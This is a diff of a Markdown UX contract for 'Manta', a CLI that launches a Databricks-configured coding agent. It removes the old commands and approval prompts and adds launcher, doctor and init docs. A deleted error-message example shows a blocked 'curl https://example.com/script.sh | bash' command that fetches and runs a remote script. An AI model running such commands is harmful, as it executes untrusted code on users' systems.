@@ -1,116 +1,72 @@
 # CLI UX Contract
 
-## UX principles
+Manta is a thin, Databricks-preconfigured launcher for the `deepagents-code`
+interactive coding agent (ADR 0007). The CLI surface is intentionally small:
+launch the TUI, plus two housekeeping subcommands.
 
-- Show the route before expensive work.
-- Show the budget before autonomy.
-- Show cost during execution.
-- Show what changed.
-- Show reviewer decisions.
-- Hide noisy logs by default but make them expandable/exportable.
-- Support machine-readable JSON output.
+## Primary surface: `manta` (interactive)
 
-## Commands
+Running `manta` with no subcommand launches the **interactive coding session**
+(like Claude Code) — the upstream `deepagents-code` TUI, preconfigured for
+Databricks. Manta resolves your profile, provisions a Databricks model provider
+in `~/.deepagents/config.toml`, and execs the TUI with
+`-M databricks:<default_endpoint>`.
+
+```text
+$ manta -p e2-demo-west
+# → launches the deepagents-code TUI, authenticated via the e2-demo-west
+#   profile, default model databricks:databricks-claude-sonnet-4-5
+```
+
+Flags:
+
+- `-p/--profile <name>` — Databricks profile (also `MANTA_PROFILE` /
+  `DATABRICKS_CONFIG_PROFILE`). Maps to `DATABRICKS_CONFIG_PROFILE` for the SDK.
+- Any flag Manta does not define is **forwarded** to `deepagents-code`, e.g.
+  `manta -r` (resume), `manta -a <agent>`, `manta --skill <name>`,
+  `manta -M databricks:<other-endpoint>` (overrides the injected default).
+
+In-session UX — model switcher (`/model`), approval/HITL, sessions/threads,
+skills, themes — is provided entirely by `deepagents-code`. Manta does not wrap
+or intercept it.
+
+## Subcommands
 
 ```bash
-manta init
-manta ask "..."
-manta route "..."
-manta plan "..."
-manta run "..." --auto --max-usd 3
-manta review
-manta security-review
-manta status
-manta resume
-manta diff
-manta approve
-manta budget
-manta models
-manta skills
-manta doctor
+manta doctor   # check deps, Databricks auth, and model wiring
+manta init     # write .manta/config.toml (launcher endpoints)
 ```
 
-## `manta run` output
+### `manta doctor`
+
+Offline preflight (no model calls beyond a model-wiring instantiation check):
 
 ```text
-Manta route
-  route: normal_code_change
-  pipeline: builder → code_reviewer
-  opus: skipped
-  max budget: $1.00
-
-Context
-  selected files: 6
-  estimated builder context: 18k tokens
-
-Execution
-  ✓ builder completed
-  ✓ tests completed
-  ✗ reviewer found 2 required fixes
-  ✓ builder applied fixes
-  ✓ final review passed
-
-Cost
-  router:   $0.003
-  builder:  $0.410
-  reviewer: $0.180
-  total:    $0.593 / $1.000
+Manta Code 0.1.0
+                            Preflight
+┏━━━━━━━━━━━━━━━━━━━━━━┳━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Check                ┃ OK  ┃ Detail                          ┃
+┡━━━━━━━━━━━━━━━━━━━━━━╇━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│ deepagents-code      │ yes │ interactive runtime             │
+│ databricks-langchain │ yes │                                 │
+│ dcode config         │ yes │ ~/.deepagents/config.toml       │
+│ model wiring         │ yes │ ChatDatabricks                  │
+│ databricks auth      │ yes │ you@example.com                 │
+└──────────────────────┴─────┴─────────────────────────────────┘
+Status: OK
 ```
 
-## Dry-run vs. real execution
+### `manta init`
 
-`manta run "..."` defaults to `--dry-run` (offline mock runtime, no model
-credentials). Pass `--no-dry-run` to execute the pipeline through the Deep
-Agents runtime (Sprint 3), which records token usage into the budget ledger and
-enforces hard caps. If the optional `[agent]` extra is not installed, the CLI
-prints a friendly message and falls back to the dry-run scaffold.
-
-## Machine-readable output
-
-`--json` should output:
-
-```json
-{
-  "session_id": "abc123",
-  "route": "normal_code_change",
-  "pipeline": ["builder", "code_reviewer"],
-  "status": "completed",
-  "cost": {"used_usd": 0.593, "max_usd": 1.0},
-  "files_changed": ["src/settings.tsx"],
-  "review": {"approved": true, "findings": []}
-}
-```
-
-## Approval prompt
-
-```text
-Manta wants to run:
-  npm run test
-
-Reason:
-  Validate changed frontend form component.
-
-Policy:
-  shell allowlisted: yes
-  network: no
-  writes outside project: no
-
-Approve? [y/N/details/always-this-session]
-```
+Writes `.manta/config.toml` with the launcher settings (default endpoint and the
+extra endpoints to register in the `deepagents-code` `/model` switcher). See
+`docs/10-config-schema.md`.
 
 ## Error style
 
-Bad:
+Errors are actionable and tell you the next step:
 
 ```text
-Error: policy failure
-```
-
-Good:
-
-```text
-Blocked by policy: command is outside shell allowlist.
-Command: curl https://example.com/script.sh | bash
-Reason: downloads and executes remote script.
-Next: approve manually with --allow-network and --approve-shell, or change the task.
+The interactive runtime (deepagents-code) is not installed.
+Install it with: pip install -e '.[agent]'
 ```
